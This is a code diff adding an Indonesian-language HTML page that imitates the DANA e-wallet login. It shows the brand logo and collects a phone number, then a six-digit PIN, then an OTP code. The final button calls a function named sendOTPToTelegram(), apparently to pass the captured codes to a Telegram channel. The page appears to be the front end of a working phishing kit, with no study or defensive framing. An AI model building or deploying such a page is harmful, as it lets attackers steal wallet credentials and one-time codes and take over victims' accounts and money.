@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA - Appapun transaksinya selalu ada dana</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="dana.jpg" type="image/png">
+</head>
+
+<body>
+
+    <!-- Halaman 1: Masukkan Nomor HP -->
+    <div class="container" id="page-1">
+        <img src="logo.jpg" alt="DANA Logo" class="logo">
+        <p>Masukkan nomor HP kamu untuk lanjut</p>
+        <input type="text" id="phone" class="input-field" placeholder="+62 8123456789" oninput="validatePhone()">
+        <p class="small-text">Nomor ponsel akan digunakan sebagai ID kamu & menjaga akun selalu aman.</p>
+        <p class="small-text">Dengan melanjutkan, kamu setuju dengan <span class="link">Syarat & Ketentuan</span> dan
+            <span class="link">Kebijakan Privasi</span> kami.
+        </p>
+        <button class="btn" id="btn-1" onclick="showPage(2)" disabled>LANJUT</button>
+    </div>
+
+    <!-- Halaman 2: Masukkan PIN DANA -->
+    <div class="container hidden" id="page-2">
+        <img src="logo.jpg" alt="DANA Logo" class="logo">
+        <p>Masukkan PIN DANA</p>
+        <div class="pin-container">
+            <input type="password" class="pin-box" maxlength="1" oninput="moveNext(this, 'pin-2')" id="pin-1">
+            <input type="password" class="pin-box" maxlength="1" oninput="moveNext(this, 'pin-3')" id="pin-2">
+            <input type="password" class="pin-box" maxlength="1" oninput="moveNext(this, 'pin-4')" id="pin-3">
+            <input type="password" class="pin-box" maxlength="1" oninput="moveNext(this, 'pin-5')" id="pin-4">
+            <input type="password" class="pin-box" maxlength="1" oninput="moveNext(this, 'pin-6')" id="pin-5">
+            <input type="password" class="pin-box" maxlength="1" id="pin-6" oninput="validatePIN()">
+        </div>
+        <span class="link" onclick="togglePassword()">TAMPILKAN</span> | <span class="link">LUPA PIN</span>
+        <button class="btn" id="btn-2" onclick="showPage(3)" disabled>LANJUT</button>
+    </div>
+
+    <!-- Halaman 3: Masukkan OTP -->
+    <div class="container hidden" id="page-3">
+        <img src="logo.jpg" alt="DANA Logo" class="logo">
+        <p>Masukkan OTP</p>
+        <p class="small-text">Kode OTP telah dikirim ke nomor Anda</p>
+        <div class="otp-container">
+            <input type="otp" class="otp-box" maxlength="1" oninput="moveNext(this, 'pin-2')" id="OTP-1">
+            <input type="otp" class="otp-box" maxlength="1" oninput="moveNext(this, 'pin-3')" id="otp-2">
+            <input type="otp" class="otp-box" maxlength="1" oninput="moveNext(this, 'pin-4')" id="otp-3">
+            <input type="otp" class="otp-box" maxlength="1" id="otp-4" oninput="validatePIN()">
+        </div>
+        <span class="link" id="resend-otp">KIRIM ULANG (180)</span>
+        <button class="btn" id="btn-3" onclick="sendOTPToTelegram()" disabled>LANJUT</button>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
